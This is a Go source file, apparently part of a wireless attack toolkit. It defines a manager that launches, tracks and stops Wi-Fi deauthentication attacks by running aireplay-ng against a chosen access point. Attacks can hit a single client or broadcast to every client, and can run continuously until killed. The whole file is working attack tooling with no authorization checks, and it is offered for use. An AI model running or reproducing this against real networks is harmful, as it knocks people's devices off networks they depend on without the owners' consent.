package deauth

import (
	"fmt"
	"log"
	"os/exec"
	"sync"
	"time"
)

type Attack struct {
	ID        string `json:"id"`
	TargetMAC string `json:"target_mac"`
	BSSID     string `json:"bssid"`
	Iface     string `json:"iface"`
	Reason    int    `json:"reason"`
	Count     int    `json:"count"`
	Sent      int    `json:"sent"`
	Running   bool   `json:"running"`
	StartedAt int64  `json:"started_at"`
}

type Manager struct {
	attacks map[string]*attackState
	mu      sync.RWMutex
}

type attackState struct {
	attack Attack
	cmd    *exec.Cmd
	stop   chan struct{}
}

func NewManager() *Manager {
	return &Manager{
		attacks: make(map[string]*attackState),
	}
}

// Start begins a deauth attack
// targetMAC: specific client MAC, or "FF:FF:FF:FF:FF:FF" for broadcast (all clients)
// bssid: the AP's BSSID to deauth from
// count: number of deauth packets (0 = continuous)
// iface: monitor mode interface (e.g. wlan1mon)
func (m *Manager) Start(id, targetMAC, bssid, iface string, count int) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	if _, exists := m.attacks[id]; exists {
		return fmt.Errorf("attack %s already running", id)
	}

	args := []string{
		"--deauth", fmt.Sprintf("%d", count),
		"-a", bssid,
	}

	// If targeting specific client (not broadcast)
	if targetMAC != "" && targetMAC != "FF:FF:FF:FF:FF:FF" {
		args = append(args, "-c", targetMAC)
	}

	args = append(args, iface)

	cmd := exec.Command("aireplay-ng", args...)

	state := &attackState{
		attack: Attack{
			ID:        id,
			TargetMAC: targetMAC,
			BSSID:     bssid,
			Iface:     iface,
			Count:     count,
			Running:   true,
			StartedAt: time.Now().Unix(),
		},
		cmd:  cmd,
		stop: make(chan struct{}),
	}

	m.attacks[id] = state

	go func() {
		log.Printf("deauth: starting attack %s -> %s (bssid: %s, count: %d)", id, targetMAC, bssid, count)
		err := cmd.Run()
		if err != nil {
			log.Printf("deauth %s: %v", id, err)
		}

		m.mu.Lock()
		if s, ok := m.attacks[id]; ok {
			s.attack.Running = false
		}
		m.mu.Unlock()
	}()

	// If count > 0, it'll stop on its own. If 0 (continuous), wait for manual stop.
	if count == 0 {
		go func() {
			<-state.stop
			if cmd.Process != nil {
				cmd.Process.Kill()
			}
		}()
	}

	return nil
}

func (m *Manager) Stop(id string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	state, ok := m.attacks[id]
	if !ok {
		return fmt.Errorf("attack %s not found", id)
	}

	if state.attack.Running {
		close(state.stop)
		if state.cmd.Process != nil {
			state.cmd.Process.Kill()
		}
		state.attack.Running = false
	}

	return nil
}

func (m *Manager) StopAll() {
	m.mu.Lock()
	defer m.mu.Unlock()

	for _, state := range m.attacks {
		if state.attack.Running {
			close(state.stop)
			if state.cmd.Process != nil {
				state.cmd.Process.Kill()
			}
			state.attack.Running = false
		}
	}
}

func (m *Manager) List() []Attack {
	m.mu.RLock()
	defer m.mu.RUnlock()

	result := make([]Attack, 0, len(m.attacks))
	for _, s := range m.attacks {
		result = append(result, s.attack)
	}
	return result
}

func (m *Manager) Get(id string) (*Attack, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if s, ok := m.attacks[id]; ok {
		a := s.attack
		return &a, true
	}
	return nil, false
}

func (m *Manager) Remove(id string) {
	m.mu.Lock()
	defer m.mu.Unlock()

	if s, ok := m.attacks[id]; ok {
		if s.attack.Running {
			close(s.stop)
			if s.cmd.Process != nil {
				s.cmd.Process.Kill()
			}
		}
		delete(m.attacks, id)
	}
}
